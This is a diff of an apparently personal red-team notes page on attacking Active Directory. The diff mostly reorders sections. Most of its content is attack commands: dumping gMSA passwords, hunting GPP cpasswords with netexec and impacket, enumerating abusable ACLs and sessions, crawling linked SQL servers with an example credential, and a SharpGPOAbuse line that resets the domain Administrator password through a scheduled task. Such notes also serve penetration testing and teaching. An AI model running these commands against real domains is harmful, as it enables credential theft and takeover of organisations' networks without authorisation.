@@ -32,22 +32,22 @@ permalink: /discov/ad
 	* [shoot-dom](#shoot-dom)
 		* [shoot-dcs](#shoot-dcs)
 		* [shoot-adcs](#shoot-adcs)
-		* [shoot-desc-users](#shoot-desc-users)
-		* [shoot-laps](#shoot-laps)
-		* [shoot-pwd-notreqd](#shoot-pwd-notreqd)
-		* [shoot-pwd-policy](#shoot-pwd-policy)
+		* [shoot-dacl](#shoot-dacl)
 		* [shoot-delegations](#shoot-delegations)
+		* [shoot-desc-users](#shoot-desc-users)
+		* [shoot-gmsa](#shoot-gmsa)
+		* [shoot-gpp](#shoot-gpp)
+		* [shoot-gpo](#shoot-gpo)
+		* [shoot-laps](#shoot-laps)
+		* [shoot-mssql-servers](#shoot-mssql-servers)
+		* [shoot-npusers](#shoot-npusers)
 		* [shoot-priv-users](#shoot-priv-users)
 		* [shoot-priv-machines](#shoot-priv-machines)
-		* [shoot-gpo](#shoot-gpo)
-		* [shoot-gpp](#shoot-gpp)
-		* [shoot-shares](#shoot-shares)
-		* [shoot-mssql-servers](#shoot-mssql-servers)
-		* [shoot-spns](#shoot-spns)
-		* [shoot-npusers](#shoot-npusers)
-		* [shoot-dacl](#shoot-dacl)
-		* [shoot-gmsa](#shoot-gmsa)
+		* [shoot-pwd-notreqd](#shoot-pwd-notreqd)
+		* [shoot-pwd-policy](#shoot-pwd-policy)
 		* [shoot-sessions](#shoot-sessions)
+		* [shoot-shares](#shoot-shares)
+		* [shoot-spns](#shoot-spns)
 * [iter](#iter)
 	* [iter-sid](#iter-sid)
 	* [iter-memberof](#iter-memberof)
@@ -229,39 +229,36 @@ Get-NetDomainController -Domain $zdom_fqdn -Server $zdom_dc_fqdn
 certify.exe find /vulnerable /domain:$zdom_fqdn /path:$zpki_dn
 ```
 
-#### <a name='shoot-desc-users'></a>shoot-desc-users
+
+#### <a name='shoot-dacl'></a>shoot-dacl
 ```powershell
+
+# STEP 1: global gathering
+Invoke-ACLScanner -ResolveGUIDs -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
+sharphound.exe --CollectionMethod ACL --domain $zdom_fqdn --domaincontroller $zdom_dc_fqdn
+
+# STEP 2: check for "authenticated users", "everyone" group, target account
+Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match $ztarg_user_name}
+$ztarg_group_name="Authenticated Users"
+# $ztarg_group_name="Everyone"
+Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match $ztarg_group_name}
+
+# STEP 3: gather info on security groups
+#$ztarg_group="Domain Computers"
+$ztarg_group_name="RDP Users"
+Get-ObjectAcl -SamAccountName $ztarg_group_name -ResolveGUIDs -Verbose -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDacl|WriteOwner|WriteProperty')}
+Invoke-ACLScanner -ResolveGUIDs -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | ?{$_.IdentityReference -match $ztarg_group_name}
+# ObjectAceType = User-Account-Restrictions
+Get-ObjectAcl -SamAccountName $ztarg_group_name -ResolveGUIDs -Verbose -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | ? { $_.ObjectAceType -match 'User-Account-Restrictions'}
+
+# STEP 4: enumerate permissions for GPOs where users with RIDs of > -1000 have some kind of modification/control rights
+Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn  | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDacl|WriteOwner|WriteProperty')}
 ```
 
-#### <a name='shoot-laps'></a>shoot-laps
-* [DirSync](https://github.com/simondotsh/DirSync)
-https://github.com/swisskyrepo/SharpLAPS
-https://github.com/p0dalirius/pyLAPS
-```powershell
-```
+sources:
+- [attack 0 to 0.9: Authorization](https://zer1t0.gitlab.io/posts/attacking_ad/#authorization)
+- BloodHound Edges: [GenericAll](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#genericall) / [WriteDacl](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#writedacl) / [GenericWrite](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#genericwrite)
 
-#### <a name='shoot-pwd-notreqd'></a>shoot-pwd-notreqd
-```powershell
-# ActiveDirectory module 
-Get-ADUser -Filter {PasswordNotRequired -eq $true -and Enabled -eq $true} | Select SamAccountName 
-```
-#### <a name='shoot-pwd-policy'></a>shoot-pwd-policy
-```powershell
-# local password policy
-net accounts
-
-# domain password policy
-net accounts /domain
-
-# enumerate the current domain controller policy
-$DCPolicy = Get-DomainPolicy -Policy $zdom_dc_fqdn -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
-$DCPolicy.PrivilegeRights # user privilege rights on the dc...
-
-# enumerate the current domain policy
-$zdom_fqdn_pos = Get-DomainPolicy -Policy $zdom_fqdn -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
-$zdom_fqdn_pos.KerberosPolicy
-$zdom_fqdn_pos.SystemAccess # password age/etc.
-```
 
 #### <a name='shoot-delegations'></a>shoot-delegations
 ```powershell
@@ -276,6 +273,94 @@ $zz = $zdom_fqdn + '/' + $ztarg_user_user
 References :
 - [thehacker.recipes/ad/movement/kerberos/delegations - KUD / KCD / RBCD](https://www.thehacker.recipes/ad/movement/kerberos/delegations)
 - [https://attack.mitre.org/techniques/T1134/001/](https://attack.mitre.org/techniques/T1134/001/)
+
+#### <a name='shoot-desc-users'></a>shoot-desc-users
+```powershell
+```
+
+#### <a name='shoot-gmsa'></a>shoot-gmsa
+```python
+# Pass the Hash, specific LDAP server
+python gMSADumper.py -u $ztarg_user_name -p $ztarg_user_pass -d $zdom_fqdn -l $zdom_dc_name
+
+# Kerberos Authentication, specific LDAP server
+python gMSADumper.py -k -d $zdom_fqdn -l $zdom_dc_name
+```
+
+#### <a name='shoot-gpp'></a>shoot-gpp
+```sh
+# find cpassword
+findstr /S /I cpassword \\$zdom_fqdn\sysvol\$zdom_fqdn\policies\*.xml
+
+# cme
+netexec smb $zdom_dc_ip -u $ztarg_user_name -p $ztarg_user_pass -M gpp_pasword
+netexec smb $zdom_dc_ip -u $ztarg_user_name -p $ztarg_user_pass -M gpp_autologin
+
+# impacket
+Get-GPPPassword.py $zz
+```
+
+#### <a name='shoot-gpo'></a>shoot-gpo
+
+* can be seen as a container applying policies on nested objects (computers, users, groups, etc.)
+* best way is to discover the [Inbound Object Control](https://bloodhound.readthedocs.io/en/latest/data-analysis/nodes.html#gpos) with bloodhound 
+* privesc: [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse), [Red Teamer’s Guide to GPOs and OUs](https://wald0.com/?p=179)
+* more current attack is to edit the sysvol to add a scheduled task like [pyGPOabuse](https://github.com/Hackndo/pyGPOAbuse?tab=readme-ov-file) or a local administrator
+
+```sh
+# list the OU, target an OU
+Get-DomainOU | select -ExpandProperty name							
+$ztarg_ou="DevOps"
+
+# list the computer of the targeted OU
+(Get-DomainOU -Identity $ztarg_ou).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name
+
+# list the GPO applied on the targeted OU 
+Get-DomainGPO -Identity (Get-DomainOU -Identity $ztarg_ou).gplink.substring(11,(Get-DomainOU -Identity $ztarg_ou).gplink.length-72)
+
+# list sysvol
+ls \\$zdom_fqdn\SYSVOL\$zdom_fqdn\Policies\
+
+# SharpGPOAbuse privesc example, add local administrator
+SharpGPOAbuse.exe --AddComputerTask --Taskname "Update" --Author $zdom_fqdn\$ztarg_user_name --Command "cmd.exe" --Arguments "/c net user Administrator Password!@# /domain" --GPOName "ADDITIONAL DC CONFIGURATION"
+```
+
+#### <a name='shoot-laps'></a>shoot-laps
+
+* [DirSync](https://github.com/simondotsh/DirSync)
+* [swisskyrepo](https://github.com/swisskyrepo/SharpLAPS)
+* [p0dalirius](https://github.com/p0dalirius/pyLAPS)
+
+```powershell
+```
+
+#### <a name='shoot-mssql-servers'></a>shoot-mssql-servers
+Txxx MSSQL servers
+
+References:
+- [BloodHound Edge SQLAdmin](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#sqladmin)
+- [PowerUpSQL CheatSheet](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)
+
+```powershell
+# Invoke-UserHunter -UserIdentity dba_admin > mssql_instances_shorted.txt
+# sed 's/MSSQLSvc\/\([a-z,A-Z,0-9]*\)\(\.contoso\.corp:\|:\)\?\(.*\)/\1/g' mssql_instances_shorted.txt | sort -u > mssql_servers_shorted.txt
+# get-content mssql_servers_shorted.txt | get-netcomputer -Identity $_ -properties cn,description,OperatingSystem,OperatingSystemVersion,isCriticalSystemObject
+ Get-SQLInstanceDomain -Verbose -DomainController $zdom_dc_fqdn -Username CONTOSO\mssql_admin -password Password01 > mssql_instances.txt
+
+# Crawling SQL server links
+ Get-SQLServerLinkCrawl -Instance $ztarg_computer_name -Verbose
+```
+
+![connection to mssql with heidisql](/assets/images/ad_heidisql_connection.png)
+```sql
+ /* list the databases linked to the MSSQL instance */
+ select * from master..sysservers 
+```
+
+#### <a name='shoot-npusers'></a>shoot-npusers
+
+```powershell
+```
 
 #### <a name='shoot-priv-users'></a>shoot-priv-users
 ```powershell
@@ -316,20 +401,36 @@ Get-NetGroupMember "Protected Users" -Domain $zdom_fqdn -DomainController $zdom_
 Get-DomainGroup -AdminCount -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | Get-NetGroupMember -Recurse -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | ?{$_.MemberName -like '*$'}
 ```
 
-#### <a name='shoot-gpo'></a>shoot-gpo
-```sh
-# list sysvol
-ls \\$zdom_fqdn\SYSVOL\$zdom_fqdn\Policies\
-
-# SharpGPOAbuse
-SharpGPOAbuse.exe --AddComputerTask --Taskname "Update" --Author $zdom_fqdn\$ztarg_user_name --Command "cmd.exe" --Arguments "/c net user Administrator Password!@# /domain" --GPOName "ADDITIONAL DC CONFIGURATION"
-
-# find cpassword
-findstr /S /I cpassword \\$zdom_fqdn\sysvol\$zdom_fqdn\policies\*.xml
-Get-GPPPassword.ps1
+#### <a name='shoot-pwd-notreqd'></a>shoot-pwd-notreqd
+```powershell
+# ActiveDirectory module 
+Get-ADUser -Filter {PasswordNotRequired -eq $true -and Enabled -eq $true} | Select SamAccountName 
 ```
-#### <a name='shoot-gpp'></a>shoot-gpp
-```sh
+
+#### <a name='shoot-pwd-policy'></a>shoot-pwd-policy
+```powershell
+# local password policy
+net accounts
+
+# domain password policy
+net accounts /domain
+
+# enumerate the current domain controller policy
+$DCPolicy = Get-DomainPolicy -Policy $zdom_dc_fqdn -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
+$DCPolicy.PrivilegeRights # user privilege rights on the dc...
+
+# enumerate the current domain policy
+$zdom_fqdn_pos = Get-DomainPolicy -Policy $zdom_fqdn -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
+$zdom_fqdn_pos.KerberosPolicy
+$zdom_fqdn_pos.SystemAccess # password age/etc.
+```
+
+#### <a name='shoot-sessions'></a>shoot-sessions
+```powershell
+Invoke-SessionHunter -NoPortScan -RawResults | select Hostname,UserSession,Access
+Find-DomainUserLocation | ft
+Find-PSRemotingLocalAdminAccess
+Find-WMILocalAdminAccess
 ```
 
 #### <a name='shoot-shares'></a>shoot-shares
@@ -353,28 +454,6 @@ Invoke-HuntSMBShares -Threads 100 -OutputDirectory "_ps_hunt_shares"  -HostList 
 
 * snippet to reset **$ztarg_creds** in [/sys/powershell#pscredential](/sys/powershell#pscredential)
 
-#### <a name='shoot-mssql-servers'></a>shoot-mssql-servers
-Txxx MSSQL servers
-
-References:
-- [BloodHound Edge SQLAdmin](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#sqladmin)
-- [PowerUpSQL CheatSheet](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)
-
-```powershell
-# Invoke-UserHunter -UserIdentity dba_admin > mssql_instances_shorted.txt
-# sed 's/MSSQLSvc\/\([a-z,A-Z,0-9]*\)\(\.contoso\.corp:\|:\)\?\(.*\)/\1/g' mssql_instances_shorted.txt | sort -u > mssql_servers_shorted.txt
-# get-content mssql_servers_shorted.txt | get-netcomputer -Identity $_ -properties cn,description,OperatingSystem,OperatingSystemVersion,isCriticalSystemObject
- Get-SQLInstanceDomain -Verbose -DomainController $zdom_dc_fqdn -Username CONTOSO\mssql_admin -password Password01 > mssql_instances.txt
-
-# Crawling SQL server links
- Get-SQLServerLinkCrawl -Instance $ztarg_computer_name -Verbose
-```
-
-![connection to mssql with heidisql](/assets/images/ad_heidisql_connection.png)
-```sql
- /* list the databases linked to the MSSQL instance */
- select * from master..sysservers 
-```
 
 #### <a name='shoot-spns'></a>shoot-spns
 
@@ -398,56 +477,6 @@ Get-DomainUser -SPN -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | ?{$_.me
 Get-NetComputer -OperatingSystem "Windows 2008*" -Ping -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
 ```
 
-#### <a name='shoot-npusers'></a>shoot-npusers
-
-```powershell
-```
-
-#### <a name='shoot-dacl'></a>shoot-dacl
-```powershell
-
-# STEP 1: global gathering
-Invoke-ACLScanner -ResolveGUIDs -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
-sharphound.exe --CollectionMethod ACL --domain $zdom_fqdn --domaincontroller $zdom_dc_fqdn
-
-# STEP 2: check for "authenticated users", "everyone" group, target account
-Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match $ztarg_user_name}
-$ztarg_group_name="Authenticated Users"
-# $ztarg_group_name="Everyone"
-Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match $ztarg_group_name}
-
-# STEP 3: gather info on security groups
-#$ztarg_group="Domain Computers"
-$ztarg_group_name="RDP Users"
-Get-ObjectAcl -SamAccountName $ztarg_group_name -ResolveGUIDs -Verbose -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDacl|WriteOwner|WriteProperty')}
-Invoke-ACLScanner -ResolveGUIDs -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | ?{$_.IdentityReference -match $ztarg_group_name}
-# ObjectAceType = User-Account-Restrictions
-Get-ObjectAcl -SamAccountName $ztarg_group_name -ResolveGUIDs -Verbose -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | ? { $_.ObjectAceType -match 'User-Account-Restrictions'}
-
-# STEP 4: enumerate permissions for GPOs where users with RIDs of > -1000 have some kind of modification/control rights
-Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn  | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDacl|WriteOwner|WriteProperty')}
-```
-
-sources:
-- [attack 0 to 0.9: Authorization](https://zer1t0.gitlab.io/posts/attacking_ad/#authorization)
-- BloodHound Edges: [GenericAll](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#genericall) / [WriteDacl](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#writedacl) / [GenericWrite](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#genericwrite)
-
-#### <a name='shoot-gmsa'></a>shoot-gmsa
-```python
-# Pass the Hash, specific LDAP server
-python gMSADumper.py -u $ztarg_user_name -p $ztarg_user_pass -d $zdom_fqdn -l $zdom_dc_name
-
-# Kerberos Authentication, specific LDAP server
-python gMSADumper.py -k -d $zdom_fqdn -l $zdom_dc_name
-```
-
-#### <a name='shoot-sessions'></a>shoot-sessions
-```powershell
-Invoke-SessionHunter -NoPortScan -RawResults | select Hostname,UserSession,Access
-Find-DomainUserLocation | ft
-Find-PSRemotingLocalAdminAccess
-Find-WMILocalAdminAccess
-```
 
 ## <a name='iter'></a>iter
 
